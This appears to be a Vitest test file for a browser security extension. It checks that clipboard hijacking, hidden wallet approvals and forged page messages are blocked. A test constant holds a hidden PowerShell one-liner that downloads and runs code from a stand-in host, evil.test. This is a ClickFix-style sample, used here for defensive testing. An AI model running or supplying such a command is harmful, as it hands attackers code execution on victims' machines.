import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { runInNewContext } from "node:vm";
import { transformSync } from "esbuild";
import { describe, expect, it } from "vitest";

const COMMAND = "powershell -w hidden -c iex(irm http://evil.test/p)";

function compile(name: string): string {
  const source = readFileSync(resolve(__dirname, "../../src/content", name), "utf8");
  return transformSync(source, { loader: "ts", target: "es2022" }).code;
}

function events() {
  const listeners = new Map<string, Array<(event: Record<string, unknown>) => void>>();
  return {
    addEventListener(type: string, fn: (event: Record<string, unknown>) => void) {
      listeners.set(type, [...(listeners.get(type) ?? []), fn]);
    },
    dispatch(type: string, event: Record<string, unknown>) {
      for (const fn of listeners.get(type) ?? []) fn(event);
    },
  };
}

function loadBridge(): {
  clipboard: { writeText: (data: string) => Promise<unknown> };
  clipboardProto: { writeText: (this: unknown, data: string) => Promise<unknown> };
  dataProto: { setData: (this: unknown, format: string, data: string) => void };
  ethereum: { request: (args: unknown) => Promise<unknown> };
  setPageConfirm: (next: () => boolean) => void;
} {
  function Clipboard(this: { writeText: (data: string) => Promise<unknown> }) {}
  Clipboard.prototype.writeText = function (data: string) {
    return Promise.resolve(data);
  };
  Clipboard.prototype.write = function () {
    return Promise.resolve();
  };
  function DataTransfer() {}
  DataTransfer.prototype.setData = function (this: { saved?: string }, format: string, data: string) {
    if (format === "text/plain") this.saved = data;
  };
  const clipboard = new (Clipboard as unknown as new () => { writeText: (data: string) => Promise<unknown> })();
  const windowEvents = events();
  const documentEvents = events();
  const ethereum = {
    request(_args: unknown) {
      return Promise.resolve("signed");
    },
  };
  const document = {
    addEventListener: documentEvents.addEventListener,
    querySelectorAll: () => [],
    body: { innerText: "" },
  };
  const window = {
    confirm: () => false,
    postMessage() {},
    addEventListener: windowEvents.addEventListener,
    document,
    ethereum,
  };
  runInNewContext(
    compile("walletBridge.ts"),
    {
      window,
      document,
      navigator: { language: "en", clipboard },
      location: { protocol: "https:", hostname: "evil.test" },
      DataTransfer,
      setTimeout: () => 0,
      Promise,
      Object,
      Array,
      String,
      BigInt,
      Error,
      WeakSet,
      JSON,
      Date,
    },
    { filename: "walletBridge.js" },
  );
  documentEvents.dispatch("DOMContentLoaded", {});
  return {
    clipboard,
    clipboardProto: Clipboard.prototype as { writeText: (this: unknown, data: string) => Promise<unknown> },
    dataProto: DataTransfer.prototype as { setData: (this: unknown, format: string, data: string) => void },
    ethereum,
    setPageConfirm(next) {
      window.confirm = next;
    },
  };
}

describe("MAIN-world bridge", () => {
  it("still vets a clipboard write after the page replaces writeText", async () => {
    const bridge = loadBridge();
    let seen = "";
    bridge.clipboard.writeText = (data: string) => {
      seen = data;
      return Promise.resolve();
    };
    await bridge.clipboard.writeText(COMMAND);
    expect(seen).not.toContain("evil.test");
    expect(seen.toLowerCase()).toContain("fundament");

    seen = "";
    await bridge.clipboardProto.writeText.call(bridge.clipboard, COMMAND);
    expect(seen).not.toContain("evil.test");
  });

  it("still vets setData after the page replaces the prototype method", () => {
    const bridge = loadBridge();
    let seen = "";
    bridge.dataProto.setData = function (_format: string, data: string) {
      seen = data;
    };
    bridge.dataProto.setData.call({}, "text/plain", COMMAND);
    expect(seen).not.toContain("evil.test");
    expect(seen.toLowerCase()).toContain("fundament");
  });

  it("still uses the original confirm after the page replaces the wallet and window.confirm", async () => {
    const bridge = loadBridge();
    bridge.setPageConfirm(() => true);
    let reached = false;
    bridge.ethereum.request = () => {
      reached = true;
      return Promise.resolve("bypassed");
    };
    await expect(bridge.ethereum.request({ method: "eth_sign", params: ["0xabc"] })).rejects.toThrow(/Fundament/);
    expect(reached).toBe(false);
  });

  it("confirms a hidden approval inside wallet_sendCalls and lets a plain call through", async () => {
    const bridge = loadBridge();
    const approval = `0xa22cb465${"0".repeat(64)}1`;
    await expect(
      bridge.ethereum.request({
        method: "wallet_sendCalls",
        params: [{ from: "0x1111111111111111111111111111111111111111", calls: [{ to: "0x2222222222222222222222222222222222222222", data: approval }] }],
      }),
    ).rejects.toThrow(/Fundament/);
    await expect(
      bridge.ethereum.request({
        method: "wallet_sendCalls",
        params: [{ calls: [{ to: "0x2222222222222222222222222222222222222222", data: "0x" }] }],
      }),
    ).resolves.toBe("signed");
  });
});

describe("isolated page checks", () => {
  it("does not read a live field value or the clipboard", () => {
    const source = readFileSync(resolve(__dirname, "../../src/content/pageChecks.ts"), "utf8");
    expect(source).not.toMatch(/\.value\b/);
    expect(source).not.toMatch(/clipboard\.read|navigator\.clipboard/);
  });

  it("reports signal names only, and a forged ping cannot send another command", async () => {
    const sent: unknown[] = [];
    const listeners = new Map<string, Array<(event: { source: unknown; data: unknown }) => void>>();
    const window = {
      top: null as unknown,
      innerWidth: 800,
      innerHeight: 600,
      addEventListener(type: string, fn: (event: { source: unknown; data: unknown }) => void) {
        listeners.set(type, [...(listeners.get(type) ?? []), fn]);
      },
      setTimeout(fn: () => void) {
        fn();
        return 0;
      },
      requestIdleCallback: undefined as unknown,
    };
    window.top = window;
    const document = {
      readyState: "complete",
      cookie: "sessionid=super-secret-cookie",
      title: "PayPal",
      forms: [] as unknown[],
      fullscreenElement: null,
      body: { innerText: "" },
      documentElement: {},
      head: {},
      addEventListener() {},
      querySelector: () => null,
      querySelectorAll: () => [],
      getElementById: () => null,
      createElement: () => ({ id: "", textContent: "" }),
    };
    runInNewContext(
      compile("pageChecks.ts"),
      {
        window,
        document,
        location: { protocol: "https:", hostname: "evil.test", href: "https://evil.test/" },
        chrome: {
          storage: { local: { get: () => Promise.resolve({ settings: { pageChecks: true, overlayProtection: true } }) } },
          runtime: { sendMessage: (message: unknown) => sent.push(structuredClone(message)) },
        },
        MutationObserver: function MutationObserver() {
          return { observe() {}, disconnect() {} };
        },
        setTimeout: (fn: () => void) => {
          fn();
          return 0;
        },
        Promise,
        Object,
        Array,
        String,
        Set,
        RegExp,
        Number,
        JSON,
      },
      { filename: "pageChecks.js" },
    );
    await Promise.resolve();
    const fire = (data: unknown) => {
      for (const fn of listeners.get("message") ?? []) fn({ source: window, data });
    };
    fire({ __fundament: "off", type: "UPDATE_SETTINGS", patch: { threatProtection: false, pageChecks: false } });
    fire({ __fundament: "login-form", hints: ["super-secret-cookie"] });
    fire(Object.create({ __fundament: "wallet-drainer" }));
    fire({ __fundament: "clickfix-clipboard", token: "super-secret-cookie" });

    const body = JSON.stringify(sent);
    expect(body).not.toContain("super-secret-cookie");
    expect(body).not.toContain("UPDATE_SETTINGS");
    expect(body).not.toContain("threatProtection");
    expect(sent).toEqual([
      { type: "PAGE_CHECK", kinds: ["cookie-flags"], hints: [] },
      { type: "PAGE_CHECK", kinds: ["clickfix-clipboard"], hints: [] },
    ]);
  });
});
